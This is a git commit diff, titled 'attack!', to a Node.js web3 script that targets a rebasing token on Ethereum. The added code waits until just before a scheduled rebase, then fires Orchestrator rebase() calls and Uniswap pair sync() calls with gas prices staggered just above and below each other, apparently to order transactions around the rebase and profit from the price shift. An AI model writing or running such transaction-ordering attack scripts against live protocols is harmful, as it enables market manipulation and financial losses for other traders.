1f559c28089a534ff42ec5e838b3e8b2209039c5
stalker474 <anton.possylkine@gmail.com>
2020-11-30 01:15:27 +0100

    attack!

--- index.js
+++ index.js
@@ -7,6 +7,7 @@ const app = express()
 
 const UFragmentsContract = require("./contracts/UFragments.json")
 const UniswapPairContract = require("./contracts/uniswap-pair.json")
+const OrchestratorContract = require("./contracts/Orchestrator.json")
 const CONF = require("./conf.json")
 
 const port = CONF.port;
@@ -36,19 +37,22 @@ app.listen(port, async () => {
   let web3 = new Web3(provider)
   let accounts = await web3.eth.getAccounts()
   let pair = new web3.eth.Contract(UniswapPairContract, CONF.pair_address)
+  let orchestrator = new web3.eth.Contract(OrchestratorContract, "0x6FB00a180781E75F87E2B690Af0196bAa77C7e7C")
   log(`Server running on port ${port}/`);
-  let date=Date.now()
-  let when=1606615140000
-  let duration = when - date
-  log("sleeping for" + duration + " ms");
-  await sleep(duration)
-  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "100000000000"}, function(error, transactionHash){})
-  await sleep(20*1000)
-  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "100000000000"}, function(error, transactionHash){})
-  await sleep(20*1000)
-  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "100000000000"}, function(error, transactionHash){})
-  await sleep(20*1000)
-  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "100000000000"}, function(error, transactionHash){})
-  await sleep(20*1000)
-  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "100000000000"}, function(error, transactionHash){})
+  let date=Date.now() / 1000
+  let when=1606701600
+  let duration = when - date - 30 //start 30 seconds before 2:00
+  log("sleeping for" + duration + " s");
+  await sleep(duration * 1000)
+  orchestrator.methods.rebase().send({from : accounts[0], gas : 750000, gasPrice : "300000000000"}, function(error, transactionHash){})
+  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "299000000000"}, function(error, transactionHash){})
+  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "301000000000"}, function(error, transactionHash){})
+  await sleep(10*1000)
+  orchestrator.methods.rebase().send({from : accounts[0], gas : 750000, gasPrice : "300000000000"}, function(error, transactionHash){})
+  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "299000000000"}, function(error, transactionHash){})
+  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "301000000000"}, function(error, transactionHash){})
+  await sleep(10*1000)
+  orchestrator.methods.rebase().send({from : accounts[0], gas : 750000, gasPrice : "300000000000"}, function(error, transactionHash){})
+  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "299000000000"}, function(error, transactionHash){})
+  pair.methods.sync().send({from : accounts[0], gas : 100000, gasPrice : "301000000000"}, function(error, transactionHash){})
 });
